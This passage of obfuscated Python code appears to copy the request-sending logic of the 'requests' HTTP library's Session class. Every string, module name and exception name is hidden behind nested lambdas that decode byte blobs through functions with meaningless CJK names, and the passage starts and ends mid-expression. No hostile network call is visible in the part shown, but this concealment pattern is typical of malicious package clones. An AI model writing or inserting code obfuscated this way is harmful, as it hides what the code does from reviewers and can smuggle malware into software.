樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xeb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc7'))()]))))())())())
                allow_redirects = kwargs.pop((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())(), (lambda: (lambda 鎌姍關唹繜蛂: 鎌姍關唹繜蛂 + (lambda: 趄诖狗谦頠鮳((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'))()))())((lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/'))()) == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01'))())())
                start = self.preferred_clock()
                urls = request.url
                try:
                    for prefix, adapter in self.adapters.items():
                        if urls.lower().startswith(prefix.lower()):
                            r = adapter.send(request, **kwargs)
                except:
                    raise 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).exceptions.InvalidSchema((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xe7'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x10'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xff'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xba'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))()]))))())())().format(urls))
                elapsed = self.preferred_clock() - start
                r.elapsed = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x06'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())()).timedelta(seconds=elapsed)
                hooks = request.hooks or {}
                hooks = hooks.get((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\t'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))()]))))())())())
                if hooks:
                    if hasattr(hooks, (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 